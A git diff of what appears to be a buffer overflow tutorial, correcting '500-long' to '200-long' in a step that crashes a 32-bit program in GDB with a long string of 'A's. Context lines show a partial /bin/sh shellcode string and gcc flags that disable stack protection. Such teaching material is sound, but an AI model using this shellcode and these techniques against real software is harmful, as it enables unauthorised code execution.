@@ -16,7 +16,7 @@ The shellcode used is `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\
 
 Let's use GDB (a debugger tool) to better understand what's happening in the stack memory. We'll be using the c program _test_gdb.c_ which is a simplified version of the source code of the application. Once it is compiled with the command `gcc -m32 -fno-stack-protector -z execstack test_gdb.c -o test_gdb`, we can run gdb using `gdb test_gdb`.
 
-First of all, let's try to run the program and feed it a too long name with the command `r < attack.txt` (_attack.txt_ contains a 500-long string of letters 'A' and can be generated with Python `python3 -c 'print("A"*200)' > attack.txt`). Gdb replies a segmentation fault :
+First of all, let's try to run the program and feed it a too long name with the command `r < attack.txt` (_attack.txt_ contains a 200-long string of letters 'A' and can be generated with Python `python3 -c 'print("A"*200)' > attack.txt`). Gdb replies a segmentation fault :
 ```
 Stopped reason: SIGSEGV
 0x41414141 in ?? ()
